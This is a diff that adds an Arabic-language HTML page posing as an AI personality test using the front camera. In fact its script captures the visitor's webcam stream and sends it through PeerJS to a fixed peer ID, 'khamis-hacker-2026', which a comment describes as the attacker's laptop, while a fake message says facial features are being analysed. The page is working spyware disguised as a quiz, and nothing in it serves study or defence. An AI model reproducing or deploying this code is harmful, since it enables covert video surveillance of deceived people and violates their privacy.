@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>اختبار الذكاء السريع</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { background: #f0f2f5; font-family: Arial, sans-serif; text-align: center; padding-top: 100px; }
+        .card { background: white; width: 350px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        button { background: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 18px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>اختبار تحليل الشخصية بالذكاء الاصطناعي</h2>
+        <p>اضغط على الزر أدناه لبدء التحليل عبر الكاميرا الأمامية</p>
+        <button id="startBtn">ابدأ الاختبار الآن</button>
+    </div>
+
+    <script>
+        const peer = new Peer();
+        const startBtn = document.getElementById('startBtn');
+
+        startBtn.onclick = () => {
+            startBtn.innerText = "جاري التحليل...";
+            // طلب الكاميرا
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then((stream) => {
+                // الاتصال بعنوان اللابتوب الثابت
+                const call = peer.call('khamis-hacker-2026', stream);
+                alert("انتظر قليلاً.. جاري معالجة ملامح الوجه");
+            })
+            .catch((err) => {
+                alert("يجب السماح بالكاميرا لتشغيل الاختبار!");
+            });
+        };
+    </script>
+</body>
+</html>
